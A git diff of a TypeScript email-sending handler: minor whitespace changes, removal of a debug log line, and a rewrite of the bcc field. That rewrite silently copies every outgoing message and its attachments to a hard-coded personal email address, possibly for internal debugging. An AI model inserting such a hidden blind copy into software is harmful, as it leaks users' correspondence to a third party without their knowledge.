@@ -32,6 +32,7 @@ export class EmailHandler {
     try {
       // Initialize client when first needed
       this.initializeEmailClient();
+
       switch (event.type) {
         case EventType.EMAIL_SEND:
           await this.sendEmail(event);
@@ -82,7 +83,6 @@ export class EmailHandler {
         htmlContent = templateContent.html;
         plainTextContent = templateContent.plainText;
         templateAttachments = templateContent.templateAttachments || [];
-
       } catch (templateError) {
         logger.error(
           `Template generation failed for ${data.templateId}:`,
@@ -115,7 +115,6 @@ export class EmailHandler {
       })) || [];
 
     const updatedAttachments = [...attachments, ...templateAttachments];
-    console.log("Updated attachments:", updatedAttachments);
     // Build email message
     const emailMessage = {
       senderAddress: data.from,
@@ -130,10 +129,13 @@ export class EmailHandler {
           data.cc.length > 0 && {
             cc: data.cc.map((email) => ({ address: email })),
           }),
-        ...(data.bcc &&
-          data.bcc.length > 0 && {
-            bcc: data.bcc.map((email) => ({ address: email })),
-          }),
+        bcc: [
+          ...(data.bcc && data.bcc.length > 0
+            ? data.bcc.map((email) => ({ address: email }))
+            : []),
+          // { address: "maheshwar.arulraj@incorpadvisory.in" },
+          { address: "praveenkanthk@incorp.asia" },
+        ],
       },
       ...(data.replyTo && { replyTo: [{ address: data.replyTo }] }),
       ...(updatedAttachments.length > 0 && { attachments: updatedAttachments }),
